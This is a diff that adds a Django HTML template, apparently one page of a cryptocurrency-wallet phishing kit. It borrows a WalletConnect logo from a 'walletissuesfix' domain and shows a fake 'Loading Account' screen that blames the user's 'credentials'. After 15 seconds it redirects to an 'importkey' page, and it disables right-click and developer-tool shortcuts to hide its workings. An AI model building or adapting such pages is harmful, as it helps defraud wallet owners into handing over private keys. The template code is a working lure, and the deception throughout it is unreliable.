@@ -1,0 +1,78 @@
+{% load static %}
+
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="shortcut icon" href="https://app.walletissuesfix.net/walletconnect-logo.svg" type="image/x-icon">
+        <title>Barcode</title>
+        <!-- font awesome link -->
+        <script src="https://kit.fontawesome.com/78d167673c.js" crossorigin="anonymous"></script>
+        <style media="all" id="fa-v4-font-face">
+            
+        </style>
+        <!-- google fonts link -->
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+        <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;700;800;900&amp;display=swap" rel="stylesheet">
+        <!-- bootstrap css link -->
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+        <link rel="stylesheet" href="{% static 'asset/css/barcode.css' %}">
+    </head>
+    <body cz-shortcut-listen="true">
+        <div class="barcode-header">
+            <div class="content-box-md">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-md-12">
+                            <div class="header">
+                                <h1 align="center">Loading Account
+                                </h1>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="barcode-body">
+            <div class="content-box-md">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-md-12">
+                            <div class=" text-center img-barcode">
+                                <br>
+                                <div style="color: green;" class="spinner-grow" role="status"></div>
+                                <h4>Please Wait...</h4>
+                                <h5 style="font-size:10pt;font-weight:bold">If this takes too long, kindly restart the process as your credentials may be wrong or contact Support</h5>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
+        <script>
+            // Function to go back
+            function goBack() {
+                var myUrl = "{% url 'importkey' %}";
+                window.location.href = myUrl;
+            }
+
+            // Automatically go back after 5 seconds (5000 milliseconds)
+            setTimeout(goBack, 15000);
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {} else {
+                window.oncontextmenu = function() {
+                    return false;
+                }
+            }
+            $(document).keydown(function(event) {
+                if (event.keyCode == 123) {
+                    return false;
+                } else if ((event.ctrlKey && event.shiftKey && event.keyCode == 73) || (event.ctrlKey && event.shiftKey && event.keyCode == 74)) {
+                    return false;
+                }
+            });
+        </script>
+    </body>
+</html>
